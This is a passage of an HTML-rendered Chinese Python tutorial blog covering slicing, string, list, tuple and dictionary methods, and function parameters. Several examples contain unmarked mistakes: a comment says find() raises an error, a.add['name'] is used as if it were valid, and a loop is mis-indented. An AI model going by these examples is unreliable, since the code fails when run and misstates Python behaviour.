<h5 id="0x04-break、continue"><a href="#0x04-break、continue" class="headerlink" title="0x04:break、continue"></a><strong>0x04:break、continue</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break退出循环</span><br><span class="line">continue跳过本次循环，继续下一次循环</span><br></pre></td></tr></table></figure>

<h3 id="3-高级数据类型"><a href="#3-高级数据类型" class="headerlink" title="3.高级数据类型"></a>3.高级数据类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列：一组按照顺序排序的值（数据集合</span><br><span class="line">在python中存在三种内置的序列类型：字符串、列表、元组</span><br><span class="line"></span><br><span class="line">优点：可以支持索引和切片的操作</span><br><span class="line">特征：第一个正索引为0，指向的是左端，第一个索引为负数的时候，指向的是右端</span><br><span class="line"></span><br><span class="line">#切片是指截取字符串中的任意一段内容。</span><br><span class="line">#使用方法：[起始下标:介绍下标:步长]切片截取的内容不包含结束下标对应的数据，步长指的是隔几个下标获取一个字符</span><br><span class="line"></span><br><span class="line">下标会越界，切片不会</span><br></pre></td></tr></table></figure>

<h5 id="0x01-字符串"><a href="#0x01-字符串" class="headerlink" title="0x01:字符串"></a>0x01:字符串</h5><p><strong>常用方法：</strong></p>
<table>
<thead>
<tr>
<th align="center">capitalize()</th>
<th align="center">首字母变大写</th>
</tr>
</thead>
<tbody><tr>
<td align="center">endswith()/startswith()</td>
<td align="center">是否-&gt;结束/开始</td>
</tr>
<tr>
<td align="center">id()</td>
<td align="center">查看变量内存地址</td>
</tr>
<tr>
<td align="center">find()</td>
<td align="center">检测x是否在字符串中</td>
</tr>
<tr>
<td align="center">index()</td>
<td align="center">检测x是否在字符串中</td>
</tr>
<tr>
<td align="center">isalnum()</td>
<td align="center">判断是否是字母和数字</td>
</tr>
<tr>
<td align="center">isalpha()</td>
<td align="center">判断是否是字母</td>
</tr>
<tr>
<td align="center">isdigit()</td>
<td align="center">判断是否是数字</td>
</tr>
<tr>
<td align="center">islower()</td>
<td align="center">判断是否是小写</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">循环取出所有值得用xx去连接</td>
</tr>
<tr>
<td align="center">lower()/upper()</td>
<td align="center">大小写转换</td>
</tr>
<tr>
<td align="center">swapcase()</td>
<td align="center">大写变小写，小写变大写</td>
</tr>
<tr>
<td align="center">lstrip()/rstrip()/strip()</td>
<td align="center">移除左/右/两侧空白</td>
</tr>
<tr>
<td align="center">split()</td>
<td align="center">切割字符串</td>
</tr>
<tr>
<td align="center">title()</td>
<td align="center">把每个单词的首字母变成大写</td>
</tr>
<tr>
<td align="center">replace(old,new,count=None)</td>
<td align="center">替换字符，count为替换个数，无count表示全部替换</td>
</tr>
<tr>
<td align="center">count()</td>
<td align="center">统计出现的次数</td>
</tr>
</tbody></table>
<h6 id="1-常用方法使用"><a href="#1-常用方法使用" class="headerlink" title="1.常用方法使用"></a>1.常用方法使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#capitalize()</span></span><br><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name.capitalize()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is %s&quot;</span>%name.capitalize())</span><br><span class="line"></span><br><span class="line"><span class="comment">#strip()</span></span><br><span class="line">a = <span class="string">&#x27;  yuer  &#x27;</span></span><br><span class="line">b = a.strip()</span><br><span class="line">c = a.lstrip()</span><br><span class="line">d = a.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="comment">#id()</span></span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = a <span class="comment">#对内存地址进行复制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#find()  index()</span></span><br><span class="line"><span class="comment">#find如果没有找到就返回-1</span></span><br><span class="line"><span class="comment">#find如果没有找到就会报错</span></span><br><span class="line">a = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&#x27;o&#x27;</span>))     <span class="comment">#1 第一次出现的下标，下标从0开始</span></span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#startswith() endswith()</span></span><br><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&#x27;y&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(a.endswith(<span class="string">&#x27;r&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lower()/upper()</span></span><br><span class="line"><span class="comment">#对全体进行操作</span></span><br><span class="line">a = <span class="string">&#x27;CooKie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br><span class="line"><span class="built_in">print</span>(a.upper())</span><br></pre></td></tr></table></figure>

<h6 id="2-切片操作"><a href="#2-切片操作" class="headerlink" title="2.切片操作"></a>2.切片操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;we need a pwner&#x27;</span></span><br><span class="line"><span class="comment"># slice [start:end:step]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>) <span class="comment">#输出完整数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>]) <span class="comment">#某个数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:<span class="number">6</span>])  <span class="comment"># nee 结束点不被包含 左闭右开</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:])  <span class="comment">#取到最后</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[:<span class="number">2</span>])  <span class="comment">#取前两位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>]) <span class="comment">#倒序输出 负号表示方向，从右边往左遍历</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-列表"><a href="#0x02-列表" class="headerlink" title="0x02:列表"></a>0x02:列表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序的数据集合</span><br><span class="line">1.可以随时添加、删除和修改</span><br><span class="line">2.数据是可以变化的（数据项可以变化，但地址不会改变</span><br><span class="line">3.用[]表示列表类型，数据项之间用逗号分隔，注意：数据项可以是任何类型的数据</span><br><span class="line">4.支持索引和切片来进行操作</span><br><span class="line"></span><br><span class="line">用for循环可对列表进行遍历</span><br></pre></td></tr></table></figure>

<p>列表定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li = []</span><br><span class="line">print(type(li))</span><br></pre></td></tr></table></figure>

<p>方法：</p>
<table>
<thead>
<tr>
<th>append</th>
<th>在列表后面追加元素</th>
</tr>
</thead>
<tbody><tr>
<td>len</td>
<td>输出列表中元素个数</td>
</tr>
<tr>
<td>count</td>
<td>统计元素出现的次数</td>
</tr>
<tr>
<td>extend</td>
<td>扩展，相当于批量添加</td>
</tr>
<tr>
<td>index</td>
<td>获取指定元素索引号</td>
</tr>
<tr>
<td>insert</td>
<td>在指定位置插入</td>
</tr>
<tr>
<td>pop</td>
<td>删除最后一个元素</td>
</tr>
<tr>
<td>remove</td>
<td>移除左边找到的第一个元素</td>
</tr>
<tr>
<td>reverse</td>
<td>反转列表</td>
</tr>
<tr>
<td>sort</td>
<td>列表排序</td>
</tr>
</tbody></table>
<h6 id="1-常用方法使用-1"><a href="#1-常用方法使用-1" class="headerlink" title="1.常用方法使用"></a>1.常用方法使用</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找 支持切片</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(li)  <span class="comment">#输出完成的列表</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">0</span>]) <span class="comment">#输出第一个元素</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#输出第二个到第四个元素</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">2</span>:]) <span class="comment">#第三个元素到最后</span></span><br><span class="line"><span class="built_in">print</span>(li[::-<span class="number">1</span>])  <span class="comment">#倒序输出</span></span><br><span class="line"><span class="built_in">print</span>(li*<span class="number">2</span>)  <span class="comment">#多次输出列表中的元素</span></span><br><span class="line"><span class="built_in">print</span>(li.index(<span class="number">20</span>))  <span class="comment">#返回查找元素的下标</span></span><br><span class="line"><span class="built_in">print</span>(li.index())</span><br><span class="line"><span class="comment"># index(元素,start,end)  start和end都是下标值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加 append() insert() extend()</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li.append([<span class="string">&#x27;yer&#x27;</span>])  <span class="comment">#追加的是列表</span></span><br><span class="line">li.append(<span class="string">&#x27;111&#x27;</span>) <span class="comment">#追加元素的时候只能追加一个</span></span><br><span class="line">li.insert(<span class="number">1</span>,<span class="string">&#x27;插入数据&#x27;</span>)  <span class="comment">#在指定位置插入元素</span></span><br><span class="line">d = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">11</span>))  <span class="comment">#强制转换为list对象</span></span><br><span class="line">li.extend(d) <span class="comment">#扩展可以将其他列表中的元素增加到进行操作的列表之中 批量增加</span></span><br><span class="line">li.extend([<span class="string">&#x27;123&#x27;</span>,<span class="number">234</span>,<span class="string">&#x27;dc&#x27;</span>]) <span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改  </span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li[<span class="number">0</span>] = <span class="string">&#x27;tom&#x27;</span> <span class="comment">#可以直接修改 数据类型没有要求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除 pop() del remove()</span></span><br><span class="line">li2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>,<span class="number">51</span>))</span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">0</span>]  <span class="comment">#删除第一位元素</span></span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#利用切片进行批量删除元素</span></span><br><span class="line">li2.remove(<span class="number">20</span>) <span class="comment">#移除指定的元素</span></span><br><span class="line">li2.pop(<span class="number">1</span>)  <span class="comment">#移除指定下标的元素</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="0x03-元组"><a href="#0x03-元组" class="headerlink" title="0x03:元组"></a>0x03:元组</h5><p><strong>tuple</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">元组：是一种不可变的序列，在创建之后不能做任何的修改</span><br><span class="line">1.不可变</span><br><span class="line">2.用()创建元组类型，数据项用逗号分隔</span><br><span class="line">3.可以是任何的类型</span><br><span class="line">4.当元组中只有一个元素时，要加上逗号，不然解释器会把元组当作元素处理</span><br><span class="line">5.支持切片操作</span><br></pre></td></tr></table></figure>

<p>元组创建：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))  <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<h6 id="1-简单操作"><a href="#1-简单操作" class="headerlink" title="1.简单操作"></a>1.简单操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询==&gt;for循环 索引 切片</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])  <span class="comment">#倒叙输出 从右往左下标4相当于从左往右下标-1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a[<span class="number">3</span>])) <span class="comment">#列表 虽然元组不可修改但是可以对元组中的列表进行修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内置方法 count  统计元素在元组中出现的次数</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="string">&#x27;yuer&#x27;</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#内置方法 index  查找指定元素在元组中的下标索引</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;yuer&#x27;</span>))  <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tupleA = ()  <span class="comment">#空元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line">tupleA = (<span class="string">&#x27;adcd&#x27;</span>,<span class="number">11</span>,<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line"></span><br><span class="line"><span class="comment">#两次的地址是不一样的 因为元组是不可修改的</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-字典"><a href="#0x04-字典" class="headerlink" title="0x04:字典"></a>0x04:字典</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.可以存储任意对象，以键值对的形式创建的&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;利用大括号包裹，数据项用逗号分隔</span><br><span class="line">2.字典中找某个元素时，是根据键、值字典的每个元素由2部分组成</span><br><span class="line">3.在我们不确定字典中是否存在某个键而又想获取其值的时候，可以使用get方法，还可以设置默认值</span><br><span class="line">4.字典中键不可重复，值可重复（如果有重复的键，后者会覆盖前者</span><br><span class="line">5.字典的键只能是不可变类型：数字、字符串、元组等</span><br><span class="line">6.不是序列类型，没有下标概念，不能使用索引，是python内置的高级数据类型</span><br></pre></td></tr></table></figure>

<h6 id="1-常用方法"><a href="#1-常用方法" class="headerlink" title="1.常用方法"></a>1.常用方法</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建字典</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment">#增加数据 </span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;yuer&#x27;</span> <span class="comment">#   key:value</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#元素格式</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取元素 keys() values() items()</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#只能通过键获取值，并且值可以修改</span></span><br><span class="line"><span class="built_in">print</span>(a.keys())  <span class="comment">#获取所有的键</span></span><br><span class="line"><span class="built_in">print</span>(a.values()) <span class="comment">#获取值</span></span><br><span class="line"><span class="built_in">print</span>(a.items())  <span class="comment">#获取所有的键值对，也可以通过for循环遍历</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改数据 update() add[]</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;cookie&#x27;</span>&#125;) <span class="comment">#更新数据 </span></span><br><span class="line">a.update(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;)  <span class="comment">#增加数据</span></span><br><span class="line">a.add[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除数据 del pop</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]   <span class="comment">#删除指定键</span></span><br><span class="line">a.pop(<span class="string">&#x27;name&#x27;</span>)  <span class="comment">#删除指定键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#排序操作 sorted()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">0</span>])) <span class="comment">#按照key排序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">1</span>])) <span class="comment">#按value排序，但是数据类型要一致</span></span><br><span class="line"><span class="comment"># 在函数sorted(a.items(), key = lambda d:d[1])中，第一个参数传给第二个参数“键-键值”，第二个参数取出其中的键([0])或键值(1])</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05-公用方法"><a href="#0x05-公用方法" class="headerlink" title="0x05:公用方法"></a>0x05:公用方法</h5><h6 id="1-合并操作"><a href="#1-合并操作" class="headerlink" title="1.合并操作 +"></a>1.合并操作 +</h6><p><em>使用字符串、列表、元组</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)   <span class="comment">#yuer123</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">listB = [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(listA+listB)  <span class="comment">#[1, 2, 3, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">tupleB = (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA+tupleB)  <span class="comment">#(1, 2, 3, 4, 5, 6)</span></span><br></pre></td></tr></table></figure>

<h6 id="2-复制"><a href="#2-复制" class="headerlink" title="2.复制  *"></a>2.复制  *</h6><p><em>字符串、列表、元组</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(listA*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA*<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h6 id="3-in判断元素是否存在"><a href="#3-in判断元素是否存在" class="headerlink" title="3.in判断元素是否存在"></a>3.in判断元素是否存在</h6><p><em>字符串、列表、元组、字典</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> a)  <span class="comment">#bool值</span></span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> dic) <span class="comment">#进行键查询</span></span><br></pre></td></tr></table></figure>

<h3 id="4-python函数基础"><a href="#4-python函数基础" class="headerlink" title="4.python函数基础"></a>4.python函数基础</h3><h5 id="0x01-函数基础"><a href="#0x01-函数基础" class="headerlink" title="0x01:函数基础"></a>0x01:函数基础</h5><p><u>函数定义：</u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def 关键字 小括号 :</span><br><span class="line">	代码块</span><br><span class="line">	</span><br><span class="line">def 函数名(参数列表):</span><br><span class="line">	代码块</span><br></pre></td></tr></table></figure>

<p><u>函数说明文档：</u></p>
<p>函数内容的第一行可以用字符串进行函数说明</p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    用于输出信息</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;yuer&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出不同的信息，用参数实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>(<span class="params">name,age</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    自我介绍模板</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(age))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-函数参数"><a href="#0x02-函数参数" class="headerlink" title="0x02:函数参数"></a>0x02:函数参数</h5><p>参数分类：</p>
<p>必选参数、默认参数（缺省参数）、可选参数、关键字参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数：函数为了实现某项特定功能，进而为了得到实现功能所需要的数据，为了得到外部数据</span><br><span class="line">必选参数：在函数调用的时候必须要赋值</span><br><span class="line">默认参数：</span><br><span class="line"></span><br><span class="line"># 定义函数学习参数</span><br></pre></td></tr></table></figure>

<h6 id="必选参数"><a href="#必选参数" class="headerlink" title="#必选参数"></a>#必选参数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a,b</span>):</span>  </span><br><span class="line">    <span class="comment">#a,b为形参，在定义的时候不占内存地址</span></span><br><span class="line">    <span class="built_in">sum</span> = a + b</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">a,b = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">sum</span>(a,b) <span class="comment">#调用参数 这里的a,b是实参，占用内存地址</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#直接调用会报错，必须要有两个参数，因此是必选参数</span></span><br></pre></td></tr></table></figure>

<h6 id="默认参数"><a href="#默认参数" class="headerlink" title="#默认参数"></a>#默认参数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#始终存在于参数列表中的尾部</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">a=<span class="number">20</span>,b=<span class="number">30</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;默认参数的使用=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(a+b))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>()  <span class="comment">#可直接调用，若有参数的时候对个数不强制，但如果只有一个参数的时候默认赋值给前面的形参</span></span><br></pre></td></tr></table></figure>

<h6 id="可选参数（不定长参数"><a href="#可选参数（不定长参数" class="headerlink" title="#可选参数（不定长参数"></a>#可选参数（不定长参数</h6><p><em>接受的数据是一个元组类型</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#当参数的个数不确定时使用，比较灵活</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    可变长的参数类型</span></span><br><span class="line"><span class="string">    累加</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>)  </span><br><span class="line"><span class="built_in">sum</span>(<span class="number">1</span>,<span class="number">2</span>)  <span class="comment">#以元组形式进行输出</span></span><br><span class="line"><span class="comment">#for循环实现多参数遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">	<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">   	 	<span class="keyword">for</span> i <span class="keyword">in</span> args:</span><br><span class="line">        	<span class="built_in">sum</span> += i</span><br><span class="line">        	<span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="关键字可变参数"><a href="#关键字可变参数" class="headerlink" title="#关键字可变参数"></a>#关键字可变参数</h6><p><em>接受的数据是字典类型</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ** 来定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在函数体内 参数关键字是一个字典类型，key是一个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keyFunc</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">keyFunct(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">#报错</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;11&#x27;</span>&#125;</span><br><span class="line">keyFunc() <span class="comment">#空字典</span></span><br><span class="line">keyFunc(**a)  <span class="comment">#直接传字典的时候要加上 **</span></span><br><span class="line">keyFunc(name=<span class="string">&#x27;peter&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#应该以键值对的形式传参</span></span><br></pre></td></tr></table></figure>

